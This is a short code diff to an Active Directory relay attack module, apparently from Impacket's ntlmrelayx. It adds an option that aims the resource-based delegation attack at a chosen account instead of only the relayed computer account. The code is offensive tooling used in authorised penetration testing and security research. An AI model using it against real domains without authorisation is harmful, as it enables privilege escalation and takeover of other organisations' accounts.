@@ -1339,9 +1339,10 @@ class LDAPAttack(ProtocolAttack):
             LOG.debug("Computer container is {}".format(computerscontainer))
             self.addComputer(computerscontainer, domainDumper)
 
-        # Perform the Delegate attack if it is enabled and we relayed a computer account
-        if self.config.delegateaccess and self.username[-1] == '$':
-            self.delegateAttack(self.config.escalateuser, self.username, domainDumper, self.config.sid)
+        # Perform the Delegate attack on --delegate-target, or on the relayed computer account by default
+        if self.config.delegateaccess and (self.config.delegatetarget or self.username[-1] == '$'):
+            targetsam = self.config.delegatetarget if self.config.delegatetarget else self.username
+            self.delegateAttack(self.config.escalateuser, targetsam, domainDumper, self.config.sid)
             return
         
         # Perform the Shadow Credentials attack if it is enabled
